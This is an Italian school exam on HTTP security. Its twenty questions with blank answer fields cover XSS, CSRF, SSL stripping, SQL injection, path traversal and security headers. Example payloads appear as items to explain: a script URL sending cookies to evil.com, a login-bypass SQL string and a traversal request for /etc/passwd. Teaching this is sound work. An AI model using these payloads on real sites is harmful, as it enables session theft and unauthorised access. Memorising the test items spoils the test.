# Esercizio C — Verifica Teorica
## Sicurezza HTTP: Minacce e Contromisure — 20 Domande

**Classe**: 4ª / 5ª anno — Sistemi e Reti  
**Tempo**: 90 minuti  
**Punteggio totale**: 70 punti  
**Strumenti consentiti**: _______________________

**Nome**: ____________________________________________  
**Cognome**: _________________________________________  
**Data**: ____________________________________________

---

## Griglia di Valutazione

| Sezione | Argomento | Domande | Punti |
|---------|-----------|---------|-------|
| A | Vulnerabilità fondamentali di HTTP | 3 | 10 |
| B | Attacchi lato client | 4 | 14 |
| C | Attacchi sul canale | 3 | 12 |
| D | Attacchi lato server | 3 | 12 |
| E | Contromisure e header di sicurezza | 4 | 16 |
| F | Scenari e best practices | 3 | 6 |
| **TOTALE** | | **20** | **70** |

---

## SEZIONE A — Vulnerabilità Fondamentali di HTTP
_(10 punti — domande A1, A2, A3)_

---

### A1 — HTTP: insicuro per progetto _(3 punti)_

Spiega **perché il protocollo HTTP è considerato insicuro "by design"**, descrivendo almeno tre caratteristiche strutturali che lo rendono vulnerabile. Per ciascuna caratteristica, indica quale tipo di attacco ne consegue.

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

---

### A2 — Vulnerabilità del protocollo vs vulnerabilità dell'applicazione _(4 punti)_

Esiste una differenza importante tra **vulnerabilità del protocollo HTTP** e **vulnerabilità dell'applicazione web** che lo usa. Spiega questa distinzione con un esempio concreto per ciascuno dei due tipi.

| Tipo | Definizione | Esempio concreto | Chi è responsabile della correzione |
|------|-------------|-----------------|-------------------------------------|
| Vulnerabilità del protocollo | | | |
| Vulnerabilità dell'applicazione | | | |

_Approfondimento (facoltativo):_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |

---

### A3 — OWASP Top 10 _(3 punti)_

**a)** Cos'è l'OWASP (Open Web Application Security Project) e qual è lo scopo dell'OWASP Top 10?

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |

**b)** Elenca **almeno 5 categorie** dell'OWASP Top 10 (versione attuale) e per ciascuna fornisci una breve descrizione:

| # | Categoria OWASP | Descrizione breve |
|---|----------------|------------------|
| 1 | | |
| 2 | | |
| 3 | | |
| 4 | | |
| 5 | | |

---

## SEZIONE B — Attacchi Lato Client
_(14 punti — domande B1, B2, B3, B4)_

---

### B1 — XSS: Cross-Site Scripting _(4 punti)_

**a)** Descrivi il meccanismo dell'attacco **XSS Reflected** e spiega la differenza con **XSS Stored** e **XSS DOM-based**.

| Tipo XSS | Meccanismo | Dove viene "memorizzato" il payload | Persistenza |
|----------|-----------|-------------------------------------|-------------|
| Reflected | | | |
| Stored | | | |
| DOM-based | | | |

**b)** Il seguente URL è un esempio di attacco XSS Reflected. Spiega cosa succede quando una vittima clicca su questo link e quali danni può causare l'attaccante:

```
https://vulnerabile.example.com/cerca?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

---

### B2 — CSRF: Cross-Site Request Forgery _(4 punti)_

**a)** Spiega il meccanismo di un attacco CSRF. Descrivi uno scenario concreto: un utente è loggato su `banca.it` e visita `evil.com`. Cosa può fare l'attaccante?

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

**b)** Qual è la **differenza principale** tra XSS e CSRF? Completa la tabella:

| Caratteristica | XSS | CSRF |
|----------------|-----|------|
| Chi esegue il codice malevolo? | | |
| Cosa sfrutta l'attacco? | | |
| Obiettivo principale | | |
| Contromisura principale | | |

**c)** Cos'è un **token anti-CSRF** e come funziona? _(2 righe)_

|  |  |
|--|--|
|  |  |
|  |  |

---

### B3 — Clickjacking _(3 punti)_

**a)** Descrivi l'attacco **Clickjacking** e spiega come viene usato un `<iframe>` invisibile per ingannare l'utente.

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |

**b)** Quale header HTTP permette di difendersi dal Clickjacking? Indica i possibili valori e il loro significato:

| Header | Valore | Effetto |
|--------|--------|---------|
| `X-Frame-Options` | `DENY` | |
| `X-Frame-Options` | `SAMEORIGIN` | |
| `Content-Security-Policy` | `frame-ancestors 'none'` | |

---

### B4 — Session Hijacking _(3 punti)_

**a)** Descrivi le due principali tecniche di **Session Hijacking**:

| Tecnica | Meccanismo | Come si previene |
|---------|-----------|-----------------|
| Cookie Theft (via XSS) | | |
| Session Fixation | | |

**b)** Spiega il ruolo degli attributi del cookie nella protezione delle sessioni:

| Attributo | Effetto | Quale attacco previene |
|-----------|---------|----------------------|
| `HttpOnly` | | |
| `Secure` | | |
| `SameSite=Strict` | | |

---

## SEZIONE C — Attacchi sul Canale
_(12 punti — domande C1, C2, C3)_

---

### C1 — Man-in-the-Middle su HTTP _(4 punti)_

**a)** Descrivi un attacco **MITM (Man-in-the-Middle)** su una connessione HTTP non cifrata. Indica almeno due azioni che l'attaccante può compiere dopo essersi inserito nel canale di comunicazione.

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

**b)** Completa lo schema:

```
[Vittima] ←──── HTTP ────→ [???] ←──── HTTPS ────→ [Server legittimo]
```

Cosa fa il nodo `[???]`? Come si chiama questa variante dell'attacco MITM?

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |

---

### C2 — SSL Stripping _(4 punti)_

**a)** Spiega l'attacco **SSL Stripping** (proposto da Moxie Marlinspike nel 2009):
- Come funziona il downgrade da HTTPS a HTTP?
- Perché l'utente spesso non si accorge dell'attacco?
- Come si difende un sito web da questo attacco?

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

**b)** Che ruolo svolge l'header **HSTS** nella difesa contro SSL Stripping? Perché non è sufficiente un semplice redirect 301?

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |

---

### C3 — HTTP Request Smuggling _(4 punti)_

**a)** Che cos'è l'**HTTP Request Smuggling**? Su quale ambiguità nel parsing del protocollo si basa?

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |

**b)** In quale tipo di architettura di rete questo attacco è particolarmente pericoloso? (indica la risposta corretta)

- [ ] Server singolo senza proxy
- [ ] Architettura con reverse proxy o load balancer davanti al server web
- [ ] Reti IPv6 pure
- [ ] Server dietro firewall stateful

**c)** Quali sono le principali conseguenze di un attacco HTTP Request Smuggling riuscito? (elenca almeno 2)

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |

---

## SEZIONE D — Attacchi Lato Server
_(12 punti — domande D1, D2, D3)_

---

### D1 — SQL Injection via HTTP _(5 punti)_

**a)** Spiega il meccanismo della **SQL Injection** quando avviene tramite parametri HTTP GET o POST. Usa il seguente URL come punto di partenza:

```
https://negozio.example.com/prodotto?id=42
```

Come potrebbe essere modificato da un attaccante? Cosa succede al database?

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

**b)** Il seguente payload SQL viene inserito nel campo username di un form di login:

```
' OR '1'='1' --
```

Spiega cosa succede alla query SQL nel backend. Scrivi la query risultante (assuming che la query originale sia `SELECT * FROM users WHERE username='X' AND password='Y'`):

_Query originale_:
```sql
SELECT * FROM users WHERE username='X' AND password='Y'
```

_Query con l'injection_:
```sql

```

_Effetto_: _______________________________________________

**c)** Indica **due contromisure** per prevenire SQL Injection:

| Contromisura | Come funziona |
|--------------|---------------|
| 1. | |
| 2. | |

---

### D2 — Directory Traversal _(3 punti)_

**a)** Spiega l'attacco **Directory Traversal** (o Path Traversal). Come viene usata la sequenza `../` per accedere a file non autorizzati?

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |

**b)** Il seguente URL tenta un attacco Directory Traversal su un server Linux. Cosa sta cercando di leggere l'attaccante?

```
https://server.example.com/download?file=../../../../etc/passwd
```

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |

**c)** Come si previene questo attacco? (almeno 2 metodi)

|  |  |
|--|--|
|  |  |
|  |  |

---

### D3 — Broken Access Control _(4 punti)_

**a)** Cos'è il **Broken Access Control** (controllo degli accessi non funzionante)? Fornisci un esempio concreto con URL.

_Risposta ed esempio URL_:

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |

**b)** Differenzia tra i due scenari seguenti e indica quale tecnica di attacco viene usata:

| Scenario | Tecnica | Spiegazione |
|----------|---------|-------------|
| Un utente cambia `?user_id=123` in `?user_id=124` nell'URL e accede ai dati di un altro utente | | |
| Un utente modifica il proprio cookie di sessione da `role=user` a `role=admin` | | |

**c)** Qual è la contromisura principale contro il Broken Access Control?

|  |  |
|--|--|
|  |  |
|  |  |

---

## SEZIONE E — Contromisure e Header di Sicurezza
_(16 punti — domande E1, E2, E3, E4)_

---

### E1 — HTTPS e TLS come prima difesa _(4 punti)_

Spiega perché **HTTPS con TLS** è considerato la prima e più importante contromisura alla sicurezza web. Nella tua risposta includi:
- Cosa protegge (confidenzialità, integrità, autenticazione)
- Il ruolo del certificato digitale e della CA (Certification Authority)
- Perché TLS da solo non basta (quali attacchi non previene)

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

---

### E2 — Header di sicurezza HTTP _(5 punti)_

Per ciascuno dei seguenti header HTTP di sicurezza, spiega lo scopo, la sintassi base e cosa succede se è assente:

| Header | Scopo | Sintassi (esempio) | Rischio se assente |
|--------|-------|-------------------|-------------------|
| `Strict-Transport-Security` | | | |
| `Content-Security-Policy` | | | |
| `X-Frame-Options` | | | |
| `X-Content-Type-Options` | | | |
| `Referrer-Policy` | | | |

---

### E3 — Cookie sicuri _(4 punti)_

**a)** Spiega come gli attributi dei cookie contribuiscono alla sicurezza di un'applicazione web:

| Attributo | Sintassi | Cosa impedisce | Quale attacco previene |
|-----------|---------|---------------|----------------------|
| `HttpOnly` | `Set-Cookie: session=abc; HttpOnly` | | |
| `Secure` | | | |
| `SameSite=Strict` | | | |
| `SameSite=Lax` | | | |

**b)** Un'applicazione imposta il cookie di sessione così:
```http
Set-Cookie: sessionid=xyz123; Path=/; Expires=...
```
Indica **almeno 3 problemi** di sicurezza in questa configurazione e come correggerla:

| Problema | Correzione |
|----------|-----------|
| 1. | |
| 2. | |
| 3. | |

_Cookie corretto_:
```http
Set-Cookie: ________________________________
```

---

### E4 — WAF: Web Application Firewall _(3 punti)_

**a)** Cos'è un **WAF (Web Application Firewall)** e come funziona? In che modo si differenzia da un firewall di rete tradizionale?

| Caratteristica | Firewall di rete | WAF |
|----------------|-----------------|-----|
| Livello OSI operativo | | |
| Cosa ispeziona | | |
| Attacchi che blocca | | |
| Esempi di prodotti | | |

**b)** Un WAF può bloccare completamente gli attacchi SQL Injection? Motiva la risposta.

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |

---

## SEZIONE F — Scenari e Best Practices
_(6 punti — domande F1, F2, F3 — max 5 righe ciascuna)_

---

### F1 — Principio del "Least Privilege" _(2 punti)_

Spiega il principio del **minimo privilegio** (least privilege) applicato a un'applicazione web. Fornisci due esempi concreti di come si applica in una web application o nella sua infrastruttura.

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

---

### F2 — Autenticazione vs Autorizzazione _(2 punti)_

Qual è la **differenza tra autenticazione e autorizzazione** in un'applicazione web? Per ciascuna, fornisci un esempio pratico tratto da un sito web qualsiasi.

| Concetto | Definizione | Esempio pratico | Tecnologia tipica |
|----------|-------------|----------------|------------------|
| Autenticazione | | | |
| Autorizzazione | | | |

---

### F3 — Penetration Testing Web _(2 punti)_

Cos'è il **penetration testing** (o "pen test") applicato alle applicazioni web? Descrivi brevemente le fasi principali e indica perché è importante farlo regolarmente.

_Risposta:_

|  |  |
|--|--|
|  |  |
|  |  |
|  |  |
|  |  |
|  |  |

---

## 📊 Griglia di Correzione

| Sezione | Dom. | Punti max | Punti ottenuti | Note |
|---------|------|-----------|---------------|------|
| A | A1 | 3 | | |
| A | A2 | 4 | | |
| A | A3 | 3 | | |
| B | B1 | 4 | | |
| B | B2 | 4 | | |
| B | B3 | 3 | | |
| B | B4 | 3 | | |
| C | C1 | 4 | | |
| C | C2 | 4 | | |
| C | C3 | 4 | | |
| D | D1 | 5 | | |
| D | D2 | 3 | | |
| D | D3 | 4 | | |
| E | E1 | 4 | | |
| E | E2 | 5 | | |
| E | E3 | 4 | | |
| E | E4 | 3 | | |
| F | F1 | 2 | | |
| F | F2 | 2 | | |
| F | F3 | 2 | | |
| **TOTALE** | **20** | **70** | | |

**Voto finale**: _______ / 10
